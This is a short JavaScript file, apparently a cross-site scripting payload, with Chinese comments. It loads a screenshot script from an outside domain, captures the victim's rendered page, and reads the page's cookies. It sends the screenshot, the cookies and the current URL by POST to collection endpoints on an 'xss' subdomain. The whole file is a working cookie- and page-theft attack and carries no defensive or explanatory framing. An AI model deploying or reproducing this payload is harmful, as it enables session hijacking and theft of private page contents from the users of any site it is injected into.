var s1 = document.createElement('script');
s1.src = 'https://www.beishanxueyuan.com/jietu.js';
s1.onload = async function () {
    try {
            const canvas = await html2canvas(document.documentElement);
            const base64 = canvas.toDataURL('image/png');
            const requestOptions = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: currentUrl,
                    screenshot: base64
                })
            };
            fetch('https://xss.beishanxueyuan.com/api/screenshot', requestOptions)
  .then(response => {
        if (!response.ok) {
            throw new Error('网络响应不正常');
        }
        return response.json();
    })
  .then(data => {
        console.log('请求成功:', data);
    })
  .catch(error => {
        console.error('请求出错:', error);
    });
    } catch (error) {
        console.error(error);
    }
};
document.body.appendChild(s1);

// 获取当前页面的 URL
const currentUrl = window.location.href;
// 获取当前页面的 Cookie
const currentCookie = document.cookie;

// 定义请求的目标 URL
const targetUrl = 'https://xss.beishanxueyuan.com/api/get';

// 配置请求选项


const requestOptions = {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        url: currentUrl,
        cookie: currentCookie
    })
};

// 发送 POST 请求
fetch(targetUrl, requestOptions)
  .then(response => {
        if (!response.ok) {
            throw new Error('网络响应不正常');
        }
        return response.json();
    })
  .then(data => {
        console.log('请求成功:', data);
    })
  .catch(error => {
        console.error('请求出错:', error);
    });